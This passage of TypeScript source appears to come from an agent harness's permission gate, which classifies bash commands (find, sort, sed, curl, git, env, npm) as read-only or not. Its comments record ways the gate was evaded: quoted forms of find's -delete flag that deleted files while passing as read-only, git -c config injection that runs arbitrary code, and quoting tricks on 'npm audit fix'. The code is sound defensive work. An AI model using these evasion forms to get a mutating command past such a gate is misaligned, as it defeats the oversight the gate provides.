  return !curlMethodForfeits(tokens);
}

/**
 * Returns true when `bin` (with any path prefix) basename-matches "git".
 * Examples: "git", "/usr/bin/git", "./git", "/path/to/git" all return true.
 * "mygit", "gitk", "git-foo" all return false (not exact basename match).
 * Uses GIT_TOKEN_RE from command-normalize.ts for the canonical basename matching.
 */
function isGitBinary(bin: string): boolean {
  return GIT_TOKEN_RE.test(bin);
}

/**
 * Strips leading git global options from tokens, returning the index after
 * the last global option (or 1 if no options). This allows the subcommand
 * check to look at the first remaining token after global options.
 *
 * Git global options recognized: -C, --git-dir, --work-tree, --namespace
 * (value-taking), and --no-pager, -p, --paginate, --exec-path, --literal-pathspecs,
 * --no-replace-objects (no-value).
 *
 * NOTE: `-c` is deliberately NOT included because git config injection can
 * execute arbitrary code (core.fsmonitor, core.pager, core.editor, etc.);
 * if `-c` appears, the command fails closed (treated as write).
 */
function skipGitGlobalOptions(tokens: readonly string[]): number {
  let idx = 1; // Start after "git"
  while (idx < tokens.length) {
    const t = tokens[idx];
    if (t === undefined || !t.startsWith("-")) break;

    // No-value options: use the exported set (exact match or glued with =).
    if (GIT_GLOBAL_NO_VALUE_FLAGS.has(t) || Array.from(GIT_GLOBAL_NO_VALUE_FLAGS).some(f => t.startsWith(f + "="))) {
      idx += 1;
      continue;
    }

    // Value-taking options: -C, --git-dir, --work-tree, --namespace
    // (both standalone and with glued =VALUE).
    const flagName = t.indexOf("=") === -1 ? t : t.slice(0, t.indexOf("="));
    if (GIT_GLOBAL_VALUE_TAKING_FLAGS.has(flagName)) {
      if (t.includes("=")) {
        // Glued form (--flag=value), it's one token
        idx += 1;
      } else {
        // Standalone form: if there's no next token, the value is missing.
        // Fail closed: treat as write (return early).
        if (idx + 1 >= tokens.length) {
          return idx; // Stop here, leaving the flag unprocessed
        }
        idx += 2; // Skip flag and value
      }
      continue;
    }

    // Unknown flag (including `-c`, which we fail-closed on), stop.
    break;
  }
  return idx;
}

/**
 * Classify an already-tokenized, metachar-cleared argv. Factored out
 * of `isReadOnlyBashCommand` so the command-runner special cases
 * (`command` / `env`) can recurse on the residual underlying command
 * without re-parsing a reconstructed string.
 */
function classifyTokens(tokens: readonly string[]): boolean {
  const bin = tokens[0] ?? "";
  const sub = tokens[1] ?? "";

  if (SIMPLE_READ_ONLY_BINS.has(bin)) return true;

  // `command <cmd> ...` runs <cmd>, bypassing shell functions/aliases.
  // It is read-only ONLY if the command it wraps is read-only. Strip
  // `command`'s own option flags (`-p`, `-v`, `-V`, and any combined
  // short flags like `-pv`), then recurse-classify the residual argv.
  // Bare `command` (no residual) and the lookup-only forms `command
  // -v <name>` / `command -V <name>` (which print where a name
  // resolves without executing it) stay read-only.
  if (bin === "command") {
    let i = 1;
    let lookupOnly = false;
    for (; i < tokens.length; i += 1) {
      const t = tokens[i];
      if (t === undefined || !t.startsWith("-") || t === "--") break;
      if (/[vV]/.test(t)) lookupOnly = true;
    }
    if (i < tokens.length && tokens[i] === "--") i += 1;
    if (lookupOnly) return true;
    if (i >= tokens.length) return true; // bare `command`
    return classifyTokens(tokens.slice(i));
  }

  // `env [NAME=VALUE...] [flags] <cmd> ...` runs <cmd> in a modified
  // environment. It is read-only ONLY if the command it wraps is
  // read-only. Skip leading env-assignment tokens (`FOO=bar`) and
  // env's own flags, then recurse-classify the residual command. Bare
  // `env`, `env -u X`, `env FOO=bar` (no residual command, just prints
  // the environment) stay read-only.
  if (bin === "env") {
    let i = 1;
    while (i < tokens.length) {
      const t = tokens[i];
      if (t === undefined) break;
      // `env -S` / `--split-string` re-parses a string into a command:
      // forfeit read-only classification (fail closed).
      if ((ENV_SPLIT_STRING_FLAGS.test(t) || ENV_SPLIT_STRING_FLAGS.test(decodeShellWord(t)))) return false;
      if (t === "--") { i += 1; break; }
      if (ENV_VALUE_FLAGS.has(t)) { i += 2; continue; }
      if (ENV_LEADING_FLAGS.has(t)) { i += 1; continue; }
      // Long flag with a glued value (`--unset=NAME`, `--chdir=DIR`):
      // single token, skip it.
      if (t.startsWith("--") && t.includes("=")) { i += 1; continue; }
      // Short flag with a glued value (`-uNAME`, `-CDIR`): single
      // token, skip it.
      if (/^-[uC]./.test(t)) { i += 1; continue; }
      // `NAME=VALUE` environment assignment (no leading dash): skip.
      if (!t.startsWith("-") && /^[A-Za-z_][A-Za-z0-9_]*=/.test(t)) { i += 1; continue; }
      break;
    }
    if (i >= tokens.length) return true; // bare `env` / only assignments
    return classifyTokens(tokens.slice(i));
  }

  // `find` is read-only ONLY when none of its argv tokens are write
  // flags. Scan the whole argv: `-delete` / `-exec` / `-execdir` /
  // `-ok` / `-okdir` mutate the filesystem; `-fprint*` and `-fls`
  // write to operator-supplied paths without going through shell
  // redirection. If any such flag appears, fall through to block.
  if (bin === "find") {
    // Decode each token first: `-"delete"`, `-'delete'`, `-\delete`,
    // `-$'delete'` and `-de"lete"` are all the single argv entry `-delete`
    // to bash, and all five really deleted while classifying as read-only
    // (task fdee7d0f, measured with a canary file per form). Set membership
    // on the RAW token is what they defeated.
    return !tokens.slice(1).some((t) => (FIND_WRITE_FLAGS.has(t) || FIND_WRITE_FLAGS.has(decodeShellWord(t))));
  }

  // `sort` is read-only ONLY when none of its argv tokens are write or
  // exec flags: `-o`/`--output` (file output), `--compress-program`
  // (runs an arbitrary program on spill files), and
  // `-T`/`--temporary-directory` (scratch write). See `isSortWriteToken`
  // for the exact detection rules and why the enumeration must cover the
  // exec vector, not just output redirection.
  if (bin === "sort") {
    return !tokens.slice(1).some(isSortWriteToken);
  }

  // `tree` is read-only ONLY when none of its argv tokens are output
  // write flags: `-o FILE` / `--output=FILE` / `--output FILE`, or a
  // short-flag cluster containing lowercase `o` (e.g. `-rno`). tree has
  // no exec or temp-dir flags. See `isTreeWriteToken`.
  if (bin === "tree") {
    return !tokens.slice(1).some(isTreeWriteToken);
  }

  // `file` is read-only ONLY when none of its argv tokens are compile
  // flags. `-C` / `--compile` writes a compiled magic-cache file;
  // lowercase `-c` is benign (magic-file check). Any short cluster
  // containing uppercase `C` (e.g. `-bC`) is a write vector. See
  // `isFileWriteToken` for the exact detection rules.
  if (bin === "file") {
    return !tokens.slice(1).some(isFileWriteToken);
  }

  // `sed` is read-only ONLY when none of its argv tokens carry the
  // in-place-edit flag (`-i` / `-i.SUFFIX` / `--in-place`). Without
  // `-i`, sed writes only to stdout. See `isSedWriteToken`.
  if (bin === "sed") {
    return !tokens.slice(1).some(isSedWriteToken);
  }

  // `curl` is read-only ONLY when it carries no data/upload/form flag
  // and no `-X`/`--request` method other than GET/HEAD. See
  // `isReadOnlyCurlInvocation` for the exact (disclosed-boundary) flag
  // set and its known gaps (`-K`/`--config`).
  if (bin === "curl") {
    return isReadOnlyCurlInvocation(tokens.slice(1));
  }

  // `<bin> --version` / `<bin> --help` shape. Checked BEFORE the
  // per-binary branches so that `git --version`, `gh --version`,
  // `harness --version` all pass through this shape rather than
  // falling into the per-binary subcommand allowlists (which
  // intentionally don't list `--version` since it's not a
  // subcommand). Must be exactly two tokens to keep the surface
  // tight: `<bin> --version <thing>` could exfiltrate or mis-route.
  if (tokens.length === 2 && VERSION_OR_HELP_FLAGS.has(sub)) return true;

  if (isGitBinary(bin)) {
    // Strip git global options to find the subcommand.
    const argsIdx = skipGitGlobalOptions(tokens);
    const subAtIdx = tokens[argsIdx];
    if (subAtIdx === undefined) return true; // bare `git` or only options
    if (!GIT_READ_ONLY_SUBS.has(subAtIdx)) return false;
    return isReadOnlyGitInvocation(subAtIdx, tokens.slice(argsIdx + 1));
  }

  if (bin === "gh") {
    if (!GH_READ_ONLY_NOUNS.has(sub)) return false;
    const verb = tokens[2] ?? "";
    return GH_READ_ONLY_VERBS.has(verb);
  }

  if (bin === "harness") return HARNESS_READ_ONLY_SUBS.has(sub);

  if (bin === "npm") {
    // `--registry` (incl. the per-scope `--@scope:registry` form) /
    // `--userconfig` / `--globalconfig` redirect npm's network or config
    // lookups to an operator-unverified location; forfeit the read-only
    // classification for the whole npm invocation regardless of which
    // subcommand is used. See `NPM_REGISTRY_FLAG_RE` / `NPM_UNSCOPED_UNTRUSTED_FLAGS`
    // (and their docstring's stated limit — this is a CLI-token guard only,
    // it cannot see `.npmrc` or `npm_config_registry`).
    if (hasNpmUntrustedSourceFlag(tokens.slice(1))) return false;

    // `npm audit` (report) is read-only; `npm audit fix` mutates the
    // lockfile and node_modules. A token-equality denylist on `fix` is a
    // shell-quoting bypass waiting to happen: `npm audit "fix"`, `'fix'`,
    // `f''ix`, `fi"x"`, `$'fix'` all reach npm as the literal argument
    // `fix` (npm's own arg parsing, not ours, strips the quoting) while
    // none of those RAW tokens equals the string `"fix"`, so an
    // equality/`includes` check on the untouched argv silently passes them.
    // The fix is a POSITIVE shape instead: after `audit`, every remaining
    // token must either start with `-` (a flag) or be the literal verb
    // `signatures` (npm's other read-only audit arm); any other positional
    // token — quoted, glued, or a future subcommand this floor has not
    // reasoned about — forfeits the classification. This also fails closed
    // on ANY separated flag value (e.g. `npm audit --audit-level high`,
    // `npm audit --omit dev` — the value itself, `high` / `dev`, is a
    // positional token with no leading `-`), an acceptable, conservative
    // false negative; use the glued `--flag=value` form to stay floored.
    // Deliberately NOT blocked: `npm audit -fix` (single dash). Verified
    // npm 11.17.0 behavior: npm's arg parser does not recognize `-fix` as
    // the `fix` subcommand or as any known flag cluster — it errors
    // `Unknown cli config "--fix"` and falls back to the plain (read-only)
    // report. `startsWith("-")` correctly floors it; do not "fix" this into
    // a block without re-verifying npm's parser first.
    if (sub === "audit") {
      return tokens.slice(2).every((t) => t.startsWith("-") || t === "signatures");
    }
    return NPM_READ_ONLY_SUBS.has(sub);
  }

  return false;
}
